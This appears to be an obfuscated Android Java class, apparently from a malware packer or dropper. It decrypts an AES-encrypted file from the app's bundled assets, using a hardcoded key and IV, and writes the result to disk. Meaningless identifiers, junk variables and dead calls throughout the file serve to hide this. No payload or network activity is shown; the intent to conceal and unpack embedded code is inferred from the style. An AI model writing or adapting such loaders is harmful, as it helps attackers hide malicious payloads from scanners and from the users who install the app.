package ins.bcxup;

import android.content.Context;

import java.io.FileOutputStream;
import java.io.InputStream;
import java.io.OutputStream;

import javax.crypto.Cipher;
import javax.crypto.CipherOutputStream;
import javax.crypto.spec.IvParameterSpec;
import javax.crypto.spec.SecretKeySpec;

public class Aycfbwy {
    protected static int IpVbt = 1500;
    private static String FqlhfjHt = "GugBBqiMeyRIJ";
    protected static int QvQoLP = 4461;
    protected static int gwkpwhuhah() {   return 4808;    }

    public static void asncjwhqcxzw(Context asdwvzx, String cawwcv, String sswczs) {
        String sadw = "qweqdsda1eqasda2";
        String RYnBBFCAz = "BKlOIyCFrZmHrGIEsWaCdVabnwGwQiOhuefnzJHO";
        String eoRmopQk = "cNsMaPZXOCZuvvcSqBPTRcpIFZAFlVSaxRhS";
        int ZDOASvUjg = 8491;

        try {
            String SNPQkp = "YrBdOrjl";
            int pZCKkfs = 2198;
            Cipher daswcc = Cipher.getInstance("AES/CBC/PKCS5Padding");
            SecretKeySpec asaswq = new SecretKeySpec(sadw.getBytes(), "AES");
            IpVbt = 1233;
            QvQoLP = 12412;
            FqlhfjHt = "gaskfasf";
            IvParameterSpec ghasfw = new IvParameterSpec("1234567812345678".getBytes());
            daswcc.init(Cipher.DECRYPT_MODE, asaswq, ghasfw);
            String mkegx = "QjesckgtugLQiHSvOxwtEHJvfBTVZkE";
            InputStream ss = asdwvzx.getAssets().open(cawwcv);
            gwkpwhuhah();
            OutputStream dasdwqg = new FileOutputStream(sswczs);
            String vZWorLGX = "YAHhjdgtiniBtrM";
            int kehUpwXMu = 250;
            CipherOutputStream okas = new CipherOutputStream(dasdwqg, daswcc);
            byte[] iwjv = new byte[1024];
            int r;
            while ((r = ss.read(iwjv)) >= 0) {
                System.out.println();
                okas.write(iwjv, 0, r);
            }
            String HVXwJNMR = "HRhIFvDqmPlNkMpHOwk";
            int tbTfgNrW = 9795;
            lmzzik();
            bwsvuxqapi();
            okas.close();
            dasdwqg.close();
            ss.close();
        }catch (Exception dwwf){
            dwwf.printStackTrace();
        }
    }
    public static Boolean lmzzik() {   return true;    }
    public static String fxoz() {   return "uTOQSrToaJkyuicjrGv";    }
    public static void bwsvuxqapi() {   ;    }
}